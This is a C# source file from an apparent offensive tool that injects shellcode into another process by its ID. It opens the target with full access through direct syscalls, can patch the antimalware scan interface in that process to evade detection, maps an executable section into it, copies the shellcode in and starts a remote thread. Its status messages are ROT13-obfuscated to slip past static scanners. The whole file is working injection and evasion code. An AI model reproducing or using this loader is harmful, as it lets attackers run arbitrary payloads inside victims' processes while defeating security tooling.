//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class RemoteThreadView
    {
        public static void Execute(byte[] shellcode, int processID, bool remoteAm51, bool forceAm51, bool debug = false)
        {
            #region NtOpenProcess

            IntPtr rhProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };

            var ntstatus = Syscalls.NtOpenProcess(
                ref rhProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqIvrj) [+] AgBcraCebprff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");

            if (remoteAm51)
                AM51.Patch(
                    processHandle: rhProcess,
                    processID: processID,
                    force: forceAm51);

            #endregion

            #region NtCreateSection (PAGE_EXECUTE_READWRITE)

            var hSection = IntPtr.Zero;
            var maxSize = (uint)shellcode.Length;

            ntstatus = Syscalls.NtCreateSection(
                ref hSection,
                DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_READ | DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_WRITE | DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_EXECUTE,
                IntPtr.Zero,
                ref maxSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                DI.Data.Win32.WinNT.SEC_COMMIT,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqIvrj) [+] AgPerngrFrpgvba, CNTR_RKRPHGR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");

            #endregion

            #region NtMapViewOfSection (PAGE_READWRITE)

            IntPtr lhProcess = IntPtr.Zero;
            var lbaseAddress = IntPtr.Zero;
            ulong sectionOffset = 0;
            maxSize = 0;

            ntstatus = Syscalls.NtMapViewOfSection(
                hSection,
                lhProcess,
                ref lbaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                ref sectionOffset,
                ref maxSize,
                2,
                0,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqIvrj) [+] AgZncIvrjBsFrpgvba, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtMapViewOfSection (PAGE_EXECUTE_READ)

            var rbaseAddress = IntPtr.Zero;
            sectionOffset = 0;
            maxSize = 0;

            ntstatus = Syscalls.NtMapViewOfSection(
                hSection,
                rhProcess,
                ref rbaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                ref sectionOffset,
                ref maxSize,
                2,
                0,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqIvrj) [+] AgZncIvrjBsFrpgvba, CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");
            Marshal.Copy(shellcode, 0, lbaseAddress, shellcode.Length);

            #endregion

            #region RtlCreateUserThread

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Win32.RtlCreateUserThread(
                rhProcess,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                rbaseAddress,
                IntPtr.Zero,
                ref hThread,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqIvrj) [+] EgyPerngrHfreGuernq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadView) [-] RtlCreateUserThread: {ntstatus}");

            #endregion

            #region NtUnmapViewOfSection

            ntstatus = Syscalls.NtUnmapViewOfSection(
                lhProcess,
                lbaseAddress);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqIvrj) [+] AgHazncIvrjBsFrpgvba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadView) [-] NtUnmapViewOfSection: {ntstatus}");

            #endregion

            Syscalls.NtClose(hSection);
            Syscalls.NtClose(rhProcess);
        }
    }
}
